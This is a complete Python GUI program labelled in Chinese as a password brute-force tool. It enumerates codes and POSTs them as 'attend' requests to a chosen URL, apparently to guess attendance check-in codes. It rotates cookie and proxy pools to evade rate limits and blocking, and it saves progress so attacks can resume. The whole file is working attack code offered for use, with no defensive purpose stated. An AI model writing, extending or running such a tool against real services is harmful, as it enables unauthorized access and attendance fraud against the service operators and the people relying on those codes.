import tkinter as tk
from tkinter import filedialog, messagebox
import threading, requests, time, itertools, string, json, os, queue

# ===== 全局变量 =====
stop_flag = threading.Event()  # 用于停止线程

progress_index_lock = threading.Lock()   # 获取候选密码时加锁
rate_limit_lock = threading.Lock()         # 速率限制锁
cookie_index_lock = threading.Lock()         # 顺序选取 Cookie 时加锁
proxy_index_lock = threading.Lock()          # 顺序选取代理时加锁

request_timestamps = []  # 记录近5秒内请求时间戳
log_queue = queue.Queue()  # 日志队列，用于线程安全更新界面

# 全局配置（运行期间不变）
global_base_url = ""       # 用户自定义的完整 URL
global_cookie_pool = []    # Cookie 池
global_proxy_pool = []     # 代理 IP 池（可为空）
global_charset = ""        # 字符集
global_min_length = 1      # 最短密码位数
global_max_length = 6      # 最大密码位数
global_max_threads = 4     # 最大线程数
global_max_requests_5s = 90  # 每5秒允许的请求数（默认：Cookie数量*90 后续启动时自动调整）
progress_index = 0         # 全局候选密码索引（作为密码ID）

# 顺序选择时的全局索引
global_cookie_index = 0
global_proxy_index = 0

settings_filename = "settings.json"
log_filename = "log.txt"

# 用于保存日志内容（每行文本）
log_lines = []

# ===== 密码候选生成相关 =====
def get_total_candidates(charset, min_length, max_length):
    N = len(charset)
    total = 0
    for l in range(min_length, max_length + 1):
        total += N ** l
    return total

def candidate_from_index(index, charset, min_length, max_length):
    """
    按字典序生成候选密码：
    遍历所有长度从 min_length 到 max_length 的密码，
    index 为全局候选序号
    """
    N = len(charset)
    cumulative = 0
    for length in range(min_length, max_length + 1):
        count = N ** length
        if index < cumulative + count:
            offset = index - cumulative
            candidate = ""
            for i in range(length):
                candidate = charset[offset % N] + candidate
                offset //= N
            return candidate
        cumulative += count
    return None

def get_next_candidate():
    """
    获取下一个候选密码及其ID，并更新全局 progress_index，
    同时保存当前进度到本地
    """
    global progress_index
    with progress_index_lock:
        total = get_total_candidates(global_charset, global_min_length, global_max_length)
        if progress_index >= total:
            return None, progress_index
        candidate = candidate_from_index(progress_index, global_charset, global_min_length, global_max_length)
        current_id = progress_index
        progress_index += 1
        save_current_progress()  # 更新后保存进度
        return candidate, current_id

def rate_limit_acquire():
    """
    简单速率限制：确保每5秒内不超过设定的请求数
    """
    while not stop_flag.is_set():
        with rate_limit_lock:
            current_time = time.time()
            # 移除5秒之前的请求时间
            while request_timestamps and current_time - request_timestamps[0] > 5:
                request_timestamps.pop(0)
            if len(request_timestamps) < global_max_requests_5s:
                request_timestamps.append(current_time)
                return
        time.sleep(0.1)

# ===== 代理解析 =====
def parse_proxy(proxy_str):
    """
    解析格式为“代理类型://IP:端口:账户:密码”的代理字符串，
    转换为 "代理类型://账户:密码@IP:端口" 格式
    """
    try:
        parts = proxy_str.split("://", 1)
        if len(parts) != 2:
            return proxy_str
        proto = parts[0]
        rest = parts[1]
        subparts = rest.split(":")
        if len(subparts) != 4:
            return proxy_str
        ip, port, user, password = subparts
        return f"{proto}://{user}:{password}@{ip}:{port}"
    except Exception as e:
        return proxy_str

# ===== 持久化设置与日志 =====
def load_settings():
    """加载保存的设置（包括进度），返回字典或 None"""
    if os.path.exists(settings_filename):
        try:
            with open(settings_filename, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            print("加载设置失败:", e)
    return None

def save_current_progress():
    """将当前设置和进度保存到本地文件"""
    data = {
        "base_url": global_base_url,
        "cookie_pool": "\n".join(global_cookie_pool),
        "proxy_pool": "\n".join(global_proxy_pool),
        "charset": global_charset,
        "min_length": global_min_length,
        "max_length": global_max_length,
        "max_threads": global_max_threads,
        "max_requests_5s": global_max_requests_5s,
        "progress_index": progress_index
    }
    try:
        with open(settings_filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
    except Exception as e:
        print("保存设置失败:", e)

def delete_settings():
    """删除保存的设置文件"""
    if os.path.exists(settings_filename):
        try:
            os.remove(settings_filename)
        except Exception as e:
            print("删除设置失败:", e)

def load_log_file():
    """加载之前保存的日志（纯文本）"""
    if os.path.exists(log_filename):
        try:
            with open(log_filename, "r", encoding="utf-8") as f:
                return f.read()
        except Exception as e:
            print("加载日志失败:", e)
    return ""

def write_log_file():
    """将当前日志内容写入日志文件"""
    try:
        with open(log_filename, "w", encoding="utf-8") as f:
            f.write("\n".join(log_lines))
    except Exception as e:
        print("写入日志失败:", e)

# ===== 工作线程 =====
def worker(thread_id, base_url):
    global global_cookie_index, global_proxy_index
    session = requests.Session()  # 复用连接
    while not stop_flag.is_set():
        candidate, candidate_id = get_next_candidate()
        if candidate is None:
            log_queue.put((f"线程{thread_id}", "候选密码已全部尝试完毕，停止线程。"))
            stop_flag.set()
            break

        # 顺序选择 Cookie
        if global_cookie_pool:
            with cookie_index_lock:
                cookie = global_cookie_pool[global_cookie_index % len(global_cookie_pool)]
                global_cookie_index += 1
        else:
            cookie = ""
        headers = {"Cookie": cookie}

        # 顺序选择代理 IP（如果有）
        proxies = None
        if global_proxy_pool:
            with proxy_index_lock:
                proxy = global_proxy_pool[global_proxy_index % len(global_proxy_pool)]
                global_proxy_index += 1
            parsed_proxy = parse_proxy(proxy)
            proxies = {"http": parsed_proxy, "https": parsed_proxy}

        rate_limit_acquire()
        payload = {"operation": "attend", "code": candidate}
        try:
            response = session.post(base_url, headers=headers, json=payload, proxies=proxies, timeout=5)
            code = response.status_code
            log_queue.put((f"线程{thread_id}", f"尝试密码ID {candidate_id}: {candidate} => 状态码 {code}"))
            if code == 403:
                continue
            elif 200 <= code < 300:
                log_queue.put((f"线程{thread_id}", f"成功！密码ID {candidate_id}: {candidate}"))
                stop_flag.set()
                break
            else:
                continue
        except Exception as e:
            log_queue.put((f"线程{thread_id}", f"请求密码ID {candidate_id}: {candidate} 时出错: {e}"))
            continue

# ===== 图形界面 =====
class App:
    def __init__(self, master):
        self.master = master
        master.title("密码爆破工具")
        master.resizable(False, False)  # 固定窗口大小

        # ----- 上部设置区域 -----
        # Base URL（完整 URL）
        tk.Label(master, text="Base URL:").grid(row=0, column=0, sticky="w", padx=5, pady=2)
        self.base_url_entry = tk.Entry(master, width=50)
        self.base_url_entry.grid(row=0, column=1, columnspan=3, sticky="we", padx=5, pady=2)

        # Cookie 池（每行一个 Cookie）
        tk.Label(master, text="Cookie池:").grid(row=1, column=0, sticky="nw", padx=5, pady=2)
        self.cookie_text = tk.Text(master, width=50, height=5)
        self.cookie_text.grid(row=1, column=1, columnspan=3, sticky="we", padx=5, pady=2)

        # 代理 IP 池（每行一个代理，格式见要求）
        tk.Label(master, text="代理IP池:").grid(row=2, column=0, sticky="nw", padx=5, pady=2)
        self.proxy_text = tk.Text(master, width=50, height=3)
        self.proxy_text.grid(row=2, column=1, columnspan=3, sticky="we", padx=5, pady=2)

        # 字符集（自定义）及“应用参考”按钮
        tk.Label(master, text="字符集:").grid(row=3, column=0, sticky="w", padx=5, pady=2)
        self.charset_entry = tk.Entry(master, width=50)
        self.charset_entry.insert(0, string.ascii_lowercase + string.digits)
        self.charset_entry.grid(row=3, column=1, columnspan=2, sticky="we", padx=5, pady=2)
        self.apply_ref_btn = tk.Button(master, text="应用参考", command=self.apply_reference_charset)
        self.apply_ref_btn.grid(row=3, column=3, sticky="we", padx=5, pady=2)

        # 参考字符集（供参考选项）
        self.upper_var = tk.BooleanVar()
        self.lower_var = tk.BooleanVar(value=True)
        self.digit_var = tk.BooleanVar(value=True)
        self.special_var = tk.BooleanVar()
        tk.Checkbutton(master, text="大写字母", variable=self.upper_var).grid(row=4, column=0, sticky="w", padx=5)
        tk.Checkbutton(master, text="小写字母", variable=self.lower_var).grid(row=4, column=1, sticky="w", padx=5)
        tk.Checkbutton(master, text="数字", variable=self.digit_var).grid(row=4, column=2, sticky="w", padx=5)
        tk.Checkbutton(master, text="特殊符号", variable=self.special_var).grid(row=4, column=3, sticky="w", padx=5)

        # 最短密码位数
        tk.Label(master, text="最短密码位数:").grid(row=5, column=0, sticky="w", padx=5, pady=2)
        self.min_length_entry = tk.Entry(master, width=10)
        self.min_length_entry.insert(0, "1")
        self.min_length_entry.grid(row=5, column=1, sticky="w", padx=5, pady=2)

        # 最大密码位数与最大执行线程
        tk.Label(master, text="最大密码位数:").grid(row=6, column=0, sticky="w", padx=5, pady=2)
        self.max_length_entry = tk.Entry(master, width=10)
        self.max_length_entry.insert(0, "6")
        self.max_length_entry.grid(row=6, column=1, sticky="w", padx=5, pady=2)
        tk.Label(master, text="最大执行线程:").grid(row=6, column=2, sticky="w", padx=5, pady=2)
        self.max_threads_entry = tk.Entry(master, width=10)
        self.max_threads_entry.insert(0, "4")
        self.max_threads_entry.grid(row=6, column=3, sticky="w", padx=5, pady=2)
        
        # 请求速率设置（5秒内最大请求数）
        tk.Label(master, text="请求速率(5秒内最大请求数):").grid(row=7, column=0, sticky="w", padx=5, pady=2)
        self.req_rate_entry = tk.Entry(master, width=10)
        self.req_rate_entry.insert(0, "90")
        self.req_rate_entry.grid(row=7, column=1, sticky="w", padx=5, pady=2)

        # ----- 日志区域及相关按钮 -----
        tk.Label(master, text="日志:").grid(row=8, column=0, sticky="nw", padx=5, pady=2)
        log_frame = tk.Frame(master)
        log_frame.grid(row=8, column=1, columnspan=3, sticky="nsew", padx=5, pady=2)
        # 左侧按钮框
        self.log_btn_frame = tk.Frame(log_frame)
        self.log_btn_frame.pack(side="left", fill="y", padx=2)
        # 按钮：开始、暂停、保存日志、删除保存、删除日志
        self.start_button = tk.Button(self.log_btn_frame, text="开始", width=10, command=self.start_attack)
        self.start_button.pack(pady=2)
        self.pause_button = tk.Button(self.log_btn_frame, text="暂停", width=10, command=self.pause_attack)
        self.pause_button.pack(pady=2)
        self.save_log_button = tk.Button(self.log_btn_frame, text="保存日志", width=10, command=self.save_log_to_file)
        self.save_log_button.pack(pady=2)
        self.delete_settings_button = tk.Button(self.log_btn_frame, text="删除保存", width=10, command=self.delete_saved_settings)
        self.delete_settings_button.pack(pady=2)
        self.delete_log_button = tk.Button(self.log_btn_frame, text="删除日志", width=10, command=self.delete_logs)
        self.delete_log_button.pack(pady=2)
        # 右侧日志输出框（只读，多颜色显示）
        self.log_text = tk.Text(log_frame, width=70, height=15, state="disabled")
        self.log_text.pack(side="left", fill="both", expand=True, padx=2)
        # 配置不同线程颜色（最多8种）
        self.thread_colors = ["red", "blue", "green", "orange", "purple", "brown", "magenta", "teal"]
        for i, color in enumerate(self.thread_colors):
            self.log_text.tag_config(f"thread{i}", foreground=color)

        # 尝试加载上次保存的设置和日志
        self.load_saved_settings()
        self.load_saved_logs()

        self.threads = []
        self.update_log()  # 启动日志更新
        # 启动自动保存，每60秒调用一次
        self.auto_save_data()

    def apply_reference_charset(self):
        """根据参考选项更新字符集输入框"""
        charset = ""
        if self.upper_var.get():
            charset += string.ascii_uppercase
        if self.lower_var.get():
            charset += string.ascii_lowercase
        if self.digit_var.get():
            charset += string.digits
        if self.special_var.get():
            charset += string.punctuation
        charset = ''.join(sorted(set(charset)))
        self.charset_entry.delete(0, tk.END)
        self.charset_entry.insert(0, charset)
        self.log("主线程", f"已应用参考字符集：{charset}")

    def load_saved_settings(self):
        """加载保存的设置到各输入框（若存在）"""
        data = load_settings()
        if data:
            self.base_url_entry.delete(0, tk.END)
            self.base_url_entry.insert(0, data.get("base_url", ""))
            self.cookie_text.delete("1.0", tk.END)
            self.cookie_text.insert("1.0", data.get("cookie_pool", ""))
            self.proxy_text.delete("1.0", tk.END)
            self.proxy_text.insert("1.0", data.get("proxy_pool", ""))
            self.charset_entry.delete(0, tk.END)
            self.charset_entry.insert(0, data.get("charset", string.ascii_lowercase + string.digits))
            self.min_length_entry.delete(0, tk.END)
            self.min_length_entry.insert(0, str(data.get("min_length", 1)))
            self.max_length_entry.delete(0, tk.END)
            self.max_length_entry.insert(0, str(data.get("max_length", 6)))
            self.max_threads_entry.delete(0, tk.END)
            self.max_threads_entry.insert(0, str(data.get("max_threads", 4)))
            self.req_rate_entry.delete(0, tk.END)
            self.req_rate_entry.insert(0, str(data.get("max_requests_5s", 90)))
            global progress_index
            progress_index = data.get("progress_index", 0)
            self.log("主线程", f"加载保存设置，当前进度ID：{progress_index}")

    def load_saved_logs(self):
        """加载上次保存的日志到日志框"""
        content = load_log_file()
        if content:
            self.log_text.configure(state="normal")
            self.log_text.insert("end", content + "\n")
            self.log_text.configure(state="disabled")
            global log_lines
            log_lines = content.splitlines()

    def auto_save_data(self):
        """每60秒自动保存当前设置和进度"""
        save_current_progress()
        self.master.after(60000, self.auto_save_data)

    def start_attack(self):
        """开始爆破：保存当前设置、调整进度、启动工作线程"""
        global global_base_url, global_cookie_pool, global_proxy_pool, global_charset
        global global_min_length, global_max_length, global_max_threads, global_max_requests_5s, stop_flag, progress_index
        stop_flag.clear()
        # 重置速率记录
        global request_timestamps
        request_timestamps = []

        # 读取设置
        base_url = self.base_url_entry.get().strip()
        if not base_url:
            self.log("主线程", "Base URL 不能为空！")
            return
        global_base_url = base_url

        # 读取 Cookie 池
        cookies = [line.strip() for line in self.cookie_text.get("1.0", "end").splitlines() if line.strip()]
        if not cookies:
            self.log("主线程", "Cookie池不能为空！")
            return
        global_cookie_pool = cookies

        # 读取代理 IP 池
        proxies = [line.strip() for line in self.proxy_text.get("1.0", "end").splitlines() if line.strip()]
        global_proxy_pool = proxies

        global_charset = self.charset_entry.get().strip()
        if not global_charset:
            self.log("主线程", "字符集不能为空！")
            return
        try:
            global_min_length = int(self.min_length_entry.get().strip())
        except:
            global_min_length = 1
        try:
            global_max_length = int(self.max_length_entry.get().strip())
        except:
            global_max_length = 6
        try:
            global_max_threads = int(self.max_threads_entry.get().strip())
        except:
            global_max_threads = 4

        # 读取用户设置的请求速率，并限制不超过 (Cookie数 * 90)
        try:
            user_rate = int(self.req_rate_entry.get().strip())
        except:
            user_rate = 90
        default_rate = len(global_cookie_pool) * 90
        if user_rate > default_rate:
            self.log("主线程", f"请求速率设置过高，自动调整为 {default_rate}")
            global_max_requests_5s = default_rate
        else:
            global_max_requests_5s = user_rate

        # 调整断点续跑进度，回退 global_max_threads * 2，确保不遗漏
        progress_index = max(progress_index - (global_max_threads * 2), 0)
        self.log("主线程", f"调整后的进度ID：{progress_index}")

        # 保存最新设置
        save_current_progress()
        self.log("主线程", f"启动爆破：Base URL[{global_base_url}]，字符集[{global_charset}]，密码位数范围[{global_min_length}~{global_max_length}]，线程数{global_max_threads}，请求速率{global_max_requests_5s}/5s")

        # 启动工作线程
        self.threads = []
        for i in range(global_max_threads):
            t = threading.Thread(target=worker, args=(i, global_base_url))
            t.start()
            self.threads.append(t)

    def pause_attack(self):
        """暂停爆破，并保存进度"""
        stop_flag.set()
        self.log("主线程", "暂停爆破，进度已保存。")

    def save_log_to_file(self):
        """弹出文件对话框，将当前日志保存到指定文件"""
        file_path = filedialog.asksaveasfilename(title="保存日志", defaultextension=".txt",
                                                 filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")])
        if file_path:
            try:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write("\n".join(log_lines))
                self.log("主线程", f"日志已保存到 {file_path}")
            except Exception as e:
                messagebox.showerror("错误", f"保存日志失败: {e}")

    def delete_saved_settings(self):
        """删除所有保存的设置"""
        delete_settings()
        self.log("主线程", "已删除所有保存内容。")

    def delete_logs(self):
        """删除日志：清空日志框和日志文件"""
        global log_lines
        log_lines = []
        write_log_file()
        self.log_text.configure(state="normal")
        self.log_text.delete("1.0", "end")
        self.log_text.configure(state="disabled")
        self.log("主线程", "已删除日志。")

    def log(self, thread_label, message):
        """将日志消息放入队列，并写入日志文件"""
        log_line = f"{thread_label}: {message}"
        log_queue.put((thread_label, message))
        global log_lines
        log_lines.append(log_line)
        write_log_file()

    def update_log(self):
        """定时从队列中取出日志显示到文本框"""
        try:
            while True:
                thread_label, message = log_queue.get_nowait()
                if thread_label.startswith("主线程"):
                    tag = "thread0"
                else:
                    try:
                        num = int(thread_label.replace("线程", ""))
                        tag = f"thread{num % len(self.thread_colors)}"
                    except:
                        tag = "thread0"
                self.log_text.configure(state="normal")
                self.log_text.insert("end", f"{thread_label}: {message}\n", tag)
                self.log_text.configure(state="disabled")
                self.log_text.see("end")
        except queue.Empty:
            pass
        self.master.after(100, self.update_log)

if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()
